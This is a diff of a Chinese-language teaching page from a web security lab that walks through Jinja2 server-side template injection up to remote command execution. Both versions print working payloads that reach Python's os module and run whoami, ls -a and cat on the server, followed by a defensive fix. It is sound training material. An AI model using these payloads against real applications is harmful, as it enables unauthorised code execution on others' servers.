@@ -3,95 +3,78 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Lab 03 SSTI to RCE | ESAM WEB ATTACK LAB</title>
-<meta name="description" content="Server-Side Template Injection 靶機教學：由 Jinja2 模板注入逐步升級到遠端指令執行，含可複製 payload。">
+<title>Lab 03 SSTI | ESAM Web 攻防 Lab</title>
+<meta name="description" content="Server-Side Template Injection 模擬練習：從模板注入逐步升級到遠端指令執行，含可填入的 payload。">
 <link rel="stylesheet" href="style.css">
 </head>
 <body>
 <nav class="nav">
-  <div class="brand">ESAM<span>//</span>WEB_ATTACK_LAB</div>
+  <div class="brand"><span class="mark">▦</span>ESAM Web 攻防 Lab</div>
   <div class="nav-links">
-    <a href="index.html">Home</a>
-    <a href="lab1-sqli.html">01 SQLi</a>
-    <a href="lab2-xss.html">02 XSS</a>
-    <a href="lab3-ssti.html">03 SSTI</a>
+    <a href="index.html">總覽</a>
+    <a href="lab1-sqli.html">SQL Injection</a>
+    <a href="lab2-xss.html">XSS</a>
+    <a href="lab3-ssti.html">SSTI</a>
   </div>
 </nav>
+<div class="sandbox-bar">課程沙盒 · 所有帳號與資料皆為虛構，僅供授權教學使用</div>
 
 <main class="wrap">
-  <div class="kicker">// LAB 03</div>
+  <div class="kicker">Lab 03</div>
   <h1 class="title">SSTI to RCE</h1>
-  <p class="lead">頁面把網址參數直接拼進模板字串，交由 Jinja2 模板引擎解析。攻擊者可從簡單的算式注入，沿物件鏈逐步取得 Python 的 os 模組，最終在伺服器上執行任意系統指令。</p>
-  <p><span class="badge high">嚴重度 High</span> &nbsp; <span class="badge info">PORT 5002</span></p>
+  <p class="lead">頁面把輸入直接拼進模板字串，交由 Jinja2 模板引擎解析。攻擊者可從簡單的算式注入，沿物件鏈逐步取得 Python 的 os 模組，最終在伺服器上執行任意系統指令。</p>
+  <p><span class="badge high">嚴重度 High</span> &nbsp; <span class="badge info">模板求值</span></p>
 
   <h2>漏洞原理</h2>
-  <p>靶機以 <code>render_template_string()</code> 將使用者輸入直接拼進模板字串，輸入因此被 Jinja2 當成模板語法執行；加上 <code>debug=True</code> 未關閉，使攻擊面進一步放大。測試網址格式如下：</p>
-  <div class="cmd">
-    <div class="cmd-head"><span>url format</span><button class="copy">Copy</button></div>
-    <pre>http://&lt;靶機網址&gt;/?input=&lt;payload&gt;</pre>
-  </div>
+  <p>靶機以 <code>render_template_string()</code> 將使用者輸入直接拼進模板字串，輸入因此被 Jinja2 當成模板語法執行；加上 <code>debug=True</code> 未關閉，使攻擊面進一步放大。</p>
 
-  <h2>操作步驟</h2>
-  <ol class="steps">
-    <li>
-      <strong>確認輸入被輸出。</strong>頁面顯示 hello，代表參數會被回填。
-      <div class="cmd">
-        <div class="cmd-head"><span>?input=</span><button class="copy">Copy</button></div>
-        <pre>hello</pre>
-      </div>
-    </li>
-    <li>
-      <strong>確認存在 SSTI。</strong>頁面顯示 <code>49</code> 而非字串 <code>7*7</code>，代表輸入被當算式執行。
-      <div class="cmd">
-        <div class="cmd-head"><span>?input=</span><button class="copy">Copy</button></div>
-        <pre>{{7*7}}</pre>
-      </div>
-    </li>
-    <li>
-      <strong>判斷模板引擎。</strong>顯示 <code>7777777</code>，確認為 Jinja2（Python / Flask）。
-      <div class="cmd">
-        <div class="cmd-head"><span>?input=</span><button class="copy">Copy</button></div>
-        <pre>{{7*'7'}}</pre>
-      </div>
-    </li>
-    <li>
-      <strong>沿物件鏈取得 os 模組。</strong>逐層貼入，目的是從模板環境爬到 Python 內建函式。
-      <div class="cmd">
-        <div class="cmd-head"><span>?input= 逐層測試</span><button class="copy">Copy</button></div>
-        <pre>{{request}}
-{{config}}
-{{request.application.__globals__.__builtins__.__import__('os')}}</pre>
-      </div>
-    </li>
-    <li>
-      <strong>遠端指令執行 (RCE)。</strong>頁面回傳伺服器的使用者名稱，代表已能在伺服器上執行任意指令。
-      <div class="cmd">
-        <div class="cmd-head"><span>RCE payload</span><button class="copy">Copy</button></div>
-        <pre>{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}</pre>
-      </div>
-    </li>
-    <li>
-      <strong>替換指令延伸操作。</strong>將 <code>whoami</code> 換成其他指令，例如列目錄或讀檔。
-      <div class="cmd">
-        <div class="cmd-head"><span>列出目錄</span><button class="copy">Copy</button></div>
-        <pre>{{request.application.__globals__.__builtins__.__import__('os').popen('ls -a').read()}}</pre>
-      </div>
-      <div class="cmd">
-        <div class="cmd-head"><span>讀取檔案</span><button class="copy">Copy</button></div>
-        <pre>{{request.application.__globals__.__builtins__.__import__('os').popen('cat surprise.txt').read()}}</pre>
-      </div>
-    </li>
-  </ol>
+  <h2>模擬練習</h2>
+  <p class="lead">下面模擬 <code>?input=</code> 的行為。由 hello 開始確認回填，再逐步貼入 payload，觀察輸入從被當文字顯示，到被當算式執行，最後升級為指令執行。</p>
 
-  <div class="note danger">
-    <span class="label">課堂規則</span>
-    取得 RCE 後請勿執行破壞性指令。不要 <code>rm -rf</code>、不要更改密碼、不要 <code>sudo</code>，以免靶機損壞影響其他學員。
+  <div class="sim" id="ssti-sim">
+    <span class="sim-tag">模板求值</span>
+    <h3>?input=</h3>
+    <label for="ssti-input">輸入值</label>
+    <input type="text" id="ssti-input" autocomplete="off" spellcheck="false" placeholder="例如 {{7*7}}">
+    <div class="btn-row">
+      <button class="btn" id="ssti-run">送出</button>
+      <button class="btn ghost" id="ssti-reset">清除</button>
+    </div>
+    <div class="sim-out" id="ssti-out"></div>
+
+    <div class="payload-list">
+      <div class="pl-item">
+        <div><div class="pl-label">1. 確認輸入被回填</div><div class="pl-code">hello</div></div>
+        <button class="use" data-target="ssti-input" data-value="hello">填入</button>
+      </div>
+      <div class="pl-item">
+        <div><div class="pl-label">2. 確認存在 SSTI（得 49）</div><div class="pl-code">{{7*7}}</div></div>
+        <button class="use" data-target="ssti-input" data-value="{{7*7}}">填入</button>
+      </div>
+      <div class="pl-item">
+        <div><div class="pl-label">3. 判斷引擎（得 7777777）</div><div class="pl-code">{{7*'7'}}</div></div>
+        <button class="use" data-target="ssti-input" data-value="{{7*'7'}}">填入</button>
+      </div>
+      <div class="pl-item">
+        <div><div class="pl-label">4. 遠端指令執行：whoami</div><div class="pl-code">{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}</div></div>
+        <button class="use" data-target="ssti-input" data-value="{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}">填入</button>
+      </div>
+      <div class="pl-item">
+        <div><div class="pl-label">5. 列出目錄：ls -a</div><div class="pl-code">...popen('ls -a').read()}}</div></div>
+        <button class="use" data-target="ssti-input" data-value="{{request.application.__globals__.__builtins__.__import__('os').popen('ls -a').read()}}">填入</button>
+      </div>
+      <div class="pl-item">
+        <div><div class="pl-label">6. 讀取檔案：cat surprise.txt</div><div class="pl-code">...popen('cat surprise.txt').read()}}</div></div>
+        <button class="use" data-target="ssti-input" data-value="{{request.application.__globals__.__builtins__.__import__('os').popen('cat surprise.txt').read()}}">填入</button>
+      </div>
+    </div>
+    <div class="sim-note">指令輸出為教學模擬值。課堂於真實靶機操作時，請勿執行 rm、改密碼或 sudo 等破壞性指令。</div>
   </div>
 
   <h2>防禦修補</h2>
   <p>不要把使用者輸入拼進模板字串，改用 <code>render_template('檔案.html', 變數=...)</code> 將輸入當成變數傳入。生產環境關閉 <code>debug</code>，並以沙箱與最小權限執行伺服器，即使發生 RCE 也難以擴大影響。</p>
   <div class="cmd">
-    <div class="cmd-head"><span>對照</span><button class="copy">Copy</button></div>
+    <div class="cmd-head"><span>對照</span><button class="copy">複製</button></div>
     <pre># 漏洞寫法：輸入被拼進模板
 render_template_string("Hello " + user_input)
 
@@ -102,11 +85,11 @@ render_template("index.html", name=user_input)</pre>
   <div class="pager">
     <a href="lab2-xss.html">← Lab 02 XSS</a>
     <span class="spacer"></span>
-    <a href="index.html">回首頁 →</a>
+    <a href="index.html">回總覽 →</a>
   </div>
 </main>
 
-<footer class="foot">ESAM 社團法人台灣E化資安分析管理協會 &nbsp;//&nbsp; Web 攻防實戰 Lab</footer>
+<footer class="foot">ESAM 社團法人台灣E化資安分析管理協會 · Web 攻防實戰 Lab</footer>
 <script src="app.js"></script>
 </body>
 </html>
